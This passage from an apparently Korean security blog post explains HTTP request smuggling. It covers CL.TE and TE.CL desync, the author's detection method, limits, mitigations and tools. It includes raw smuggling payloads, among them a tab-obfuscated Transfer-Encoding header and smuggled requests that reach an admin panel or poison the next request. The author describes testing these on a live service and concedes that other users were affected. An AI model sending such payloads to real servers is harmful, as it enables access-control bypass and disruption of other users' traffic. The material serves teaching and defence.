d3
GET /controlroom HTTP/1.1
Host: example.com
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=1
0
```

Front-End는 Transfer-Encoding을 보기 때문에 `x=1\r\n0`까지 Back-End로 보낼 것이다. 그리고 Back-End는 Content-Length를 보기 때문에, `d3\r\n`까지만 인식을 하고 나머지 `GET /controlroom ~~ x=1\r\n0`은 Back-End에 남아 있을 것이다. 이 때 다시 본인의 요청을 보내, `GET /controlroom ~~ x=1\r\n0`이 강제로 실행 시키도록 했고 그 결과는 아래와 같았다.

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1524
Connection: keep-alive

<h1>Control Room Administration Panel</h1>

<p>Status on Load Balancers: </p> ...
<p>Status on Cache Servers: </p> ...
```

해당 공격을 통해 일반적으로 접근 할 수 없었던 URI에 접근하여 내용을 읽을 수 있었던 것이다.

(그 외에도 전에 언급한 Session 탈취 등, 다양한 Impact들에 대해서 설명했다.)

- [https://www.youtube.com/watch?v=3tpnuzFLU8g](https://www.youtube.com/watch?v=3tpnuzFLU8g)

## My Attack Method

HTTP Request Smuggling을 공격을 하면서, 과연 진짜 이 공격이 통할까 하는 의문이 많았다. 그러나 최근에 일을 하며 이 공격을 성공 시켜, 너무 당황스러웠고, 새로운 무기를 장착한것만 같은 기분이 들었다. 나의 방법은 James Kettle에서 차용해왔지만, 약간 다르게 접근하였다.

James Kettle의 Methodology에서는 'Time Out'을 강조했다. 그러나 내가 실제 공격했던 대상에는 그 어떤 Time-Out이 존재하지 않았고, (* 수정, 최근 또 하나의 대상에서 Time-Out이 발생하였다, 이건 Case-By-Case인것 같다) 오히려 테스팅했던 서버에서는 요청이 Forwarding 되지 않거나, 400으로 요청 오류가 났다. 그래서, CL.CL 서버가 아님에도 이 서버를 CL.CL 서버라고 생각했다.

그러다가 James Kettle의 방법론에서 간과한 점이 있다고 생각했다. 만약, 해당 서버가 정말 CL.TE라면(혹은 반대로 TE.CL), Content-Length와 Transfer-Encoding을 헤더 안에 넣고, 정상 적인 패킷을 그대로 보내면, 원래 기존에 보내던 패킷처럼 보내지지 않을까? 하는 생각을 해보았다. 

예시를 보자.

```
POST /search HTTP/1.1
HOST: redacted.com
Content-Length: 16
Connection: closed
...

searchText=100
```

기존 요청은 위와 같은 형태의 요청을 보내고 있었다.

나는 시간을 계산하는 방법이 아닌, "과연 정말 Front-End 혹은 Back-End가 Transfer-Encoding을 사용할까?" 라는 질문을 했었다. 그래서 나는 아래와 같은 요청을 날렸다.

```
POST /search HTTP/1.1
HOST: redacted.com
Content-Length: 25
Transfer-Encoding:[tab]chunked
Connection: close
...

10
searchText=100
0

```

위와 같은 요청을 날린 이유는, Front-End가 Content-Length를 만약 바라보고 있다면, 내가 보낸 모든 것을 뒤로 보낼 것이고, Back-End가 Transfer-Encoding을 보고 그대로 받아들여 내가 원하던 정보를 출력할 것이라는 생각이 들었기 때문이다. (혹은 그 반대) 그리하여 실제로 이 요청을 날리게 되었고 결과는 충격적이었다.

```
HTTP/1.1 200
...
```

요청을 보냈더니, 기존에 아무런 변화 없이 보냈던 요청과 정확히 일치하는 응답이 돌아왔다.

이것은 Front-End가 Content-Length를 보고 전부 뒤로 전송한 뒤 (혹은 Transfer-Encoding이 보고 전송한 뒤) Back-End는 Transfer-Encoding을 보고(혹은 반대로 Content-Length를 보고) 이를 파싱하여 결과를 출력해준 것이다. 

즉, 그림으로 표현하자면 아래의 2개 중 하나로 넘어 갈 것이다.

![CL.TE](/assets/img/20220905/Untitled%2018.png)

CL.TE

![TE.CL](/assets/img/20220905/Untitled%2019.png)

TE.CL

- 요기서 Content-Length만 보고 보낸 것이 아닌가, 혹은 Transfer-Encoding만 보고 요청에 파싱한것이 아닌가 하는 의문이 생길것이지만, Content-Length였으면 Body에 정상적인 Data가 있지 않으면 오류가 나고, Transfer-Encoding은, Content-Length없이 요청을 보냈을 때, 요청이 전송되지 않는 현상을 보고 확신 할 수 있었다.

이 현상을 보고 HTTP Request Smuggling의 핵심인 Front-End와 Back-End가 다른 헤더를 보고 Body를 파싱하고 있다는 것을 확신할 수 있었다. 

그리하여 Front-End가 'Content-Length'고 Back-End가 'Transfer-Encoding'이라는 가정하에 테스트를 진행했다.

- **참고**: James Kettle의 방법론에서는 언급되지 않았지만, 실제로 공격을 진행하고 공부하다보니, `Connection` 헤더가 매우 중요하다는 것을 깨달았다. 어째서인지, 공격이 효과적으로 성공할려면, 이 `Connection` 헤더의 값이 closed가 아닌 keep-alive로 유지 시켜줘야 한다.

Test는 매우 심플하다. CL.TE 공격으로 내 자신의 Request를 404뜨게 유도하는 방법을 선택했다.

```
POST /search HTTP/1.1
HOST: redacted.com
Content-Length: 47
Transfer-Encoding:[tab]chunked
Connection: close
...

10
searchText=100
0

GET /404 HTTP/1.1
X:X
```

참고로 공격 패킷을 보내고 내 자신이 Poison 되기 까지 대략 20번 넘는 시도가 있었다. 실제 라이브 서비스다 보니, 이용자수가 많았고, Intruder나 Python Script를 짤 수 없었던 환경이어서 수동으로 진행했다. 다른 사람들에게 아마 작은 피해는 갔겠지만(404 Redirect로 큰 피해는 아니었다), 공격 요청 20~30개 보내고 스스로 터지게 했더니 됬다.

- 개인적으로 James Kettle 방법에도 일리가 있지만, Response 시간을 보고 판단하는데에는 한계가 있다. 그리고 내가 생각했을 때 이 공격의 핵심은, Front-End와 Back-End에서 다른 헤더를 보고 Body를 판단하는 데에서 온다 판단하여 시도했다. 물론 TE.TE, CL.CL에서도 HTTP Request가 터지는 것으로 알고 있지만, TE.CL, CL.TE 환경에서는 이 방법론이 더 효과적이라고 생각한다.

## Limits

HTTP Request Smuggling (HTTP Desync)는 만능 공격인것 같지만 한계점 또한 명확한 취약점이다.

1. **공격 범위**
    
    먼저 해당 취약점의 공격 범위다. 이 공격이 성공했다고해서(Impact Radius에서 언급했듯) 무조건 모든 유저에게 영향을 끼치는 것이 아니다. 공격이 성공을 했음에도 Front-End와 Back-End의 연결에 따라 오로지 자기 자신에게만 공격할 수도 있다(Self Desync). 이런 경우는 오히려 내부에 기존에 볼 수 없었거나, 접근이 안됬던 곳에 접근하는 방법으로 취약점을 키워야한다. 일부 버그 바운티 혹은 기업들은 단순히 존재하는 것 만으로도 조치를 하는 경우가 있지만, Mitigation이 다소 쉽지 않은 취약점으로 위험을 수용하는 경우가 있다.
    
2. **False Negative**
    
    다음으로는 False Negative다. 해당 취약점을 찾기 위해서는 적지 않은 노력이 필요하다. 공격 대상이 라이브 서버고, 트래픽이 많이 존재할 수록 False Negative, 즉, 성공했음에도 실패라고 뜨는 경우가 종종 있을 것이다. 예를 들면, 공격을 확신하기 위해 본인이 보낸 공격이 자기 자신이 감염(Poison)되야 비로서 공격이 됨을 확신 할 수 있지만, 트래픽이 많으면 타 사용자를 감염시켜 공격이 안통한다고 생각할 수 있다. 또한 트래픽이 많으면 타 사용자를 감염시킬 위험성이 매우 높아져 공격에 더 신경을 써야한다.
    
3. **HTTP/2.0**
    
    마지막으로는 HTTP/2.0이다. HTTP/2.0은 Header를 정의하는 규격이 명확하며, 위에서 나온 우회방법들은 먹히지 않는다. 또한 HTTP Request Smuggling의 Mitigation으로 HTTP/1.1을 HTTP/2.0으로 업그레이드 하는 방법이 있다. (일부 기업들은 HTTP/2.0으로 바꾸는 중이다) -> *수정, HTTP/2.0에서도 발생하는 경우가 있는데 이는 다른 포스트에서 다루도록 하겠다.
    

## Mitigation

HTTP Request Smuggling의 방어 방법은 쉽지 않다. 가장 기본적이고 완벽한 방법은 HTTP/1.1 연결을 HTTP/2.0으로 업그레이드 하는 것이다. HTTP/2.0은 HTTP/1.1과 다르게 HTTP Request 패킷의 크기를 확정적으로 정의해서 네트워크를 통해서 보낸다. (자세한 것은 [https://en.wikipedia.org/wiki/HTTP/2](https://en.wikipedia.org/wiki/HTTP/2)) -> *수정, HTTP/2.0에서도 발생하는 경우가 있는데 이는 다른 포스트에서 다루도록 하겠다.

다음으로 좀 더 현실성 있고, 쉬운 방안으로는 Request 패킷에 있는 모든 Header들을 검사하는 것이다. Transfer-Encoding을 검증하거나 Content-Length를 검증해서 Front-End와 Back-End가 같은 것을 쓰도록 해야한다. 그러나 이는 개발자들의 심도있는 이해가 필요하다. 네트워크 장비들에서도 발생할 수 있는 취약점이기 때문에 개발자들의 역량이 중요하다. 대부분의 기업들이 HTTP Request Smuggling의 Mitigation을 이 방법으로 하고 있다.

## Useful Tools

- HTTP Request Smuggler (Burp Suite)
- T-Reqs
- Smuggler

## 참고
- [https://www.hahwul.com/cullinan/http-request-smuggling/](https://www.hahwul.com/cullinan/http-request-smuggling/)
- [https://www.hahwul.com/2019/08/12/http-smuggling-attack-re-born/](https://www.hahwul.com/2019/08/12/http-smuggling-attack-re-born/)
- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://drive.google.com/file/d/1iC0972G4meFPGTmqfs8g61qat7ZYLQgf/view](https://drive.google.com/file/d/1iC0972G4meFPGTmqfs8g61qat7ZYLQgf/view)
- [https://velog.io/@woounnan/DEFCON2020-uploooadit](https://velog.io/@woounnan/DEFCON2020-uploooadit)
- [https://velog.io/@thelm3716/HTTP-request-smuggling](https://velog.io/@thelm3716/HTTP-request-smuggling)
- [https://www.geeksforgeeks.org/http-headers/](https://www.geeksforgeeks.org/http-headers/)
- [https://12bme.tistory.com/325](https://12bme.tistory.com/325)
- [https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Connection](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Connection)
- [https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding)
- [https://lactea.kr/entry/Paypal%EC%97%90%EC%84%9C-%EB%B0%9C%EA%B2%AC%EB%90%9C-HTTP-Request-Smuggling-%EC%84%A4%EB%AA%85-%EB%B0%8F-%EC%98%88%EC%A0%9C](https://lactea.kr/entry/Paypal%EC%97%90%EC%84%9C-%EB%B0%9C%EA%B2%AC%EB%90%9C-HTTP-Request-Smuggling-%EC%84%A4%EB%AA%85-%EB%B0%8F-%EC%98%88%EC%A0%9C)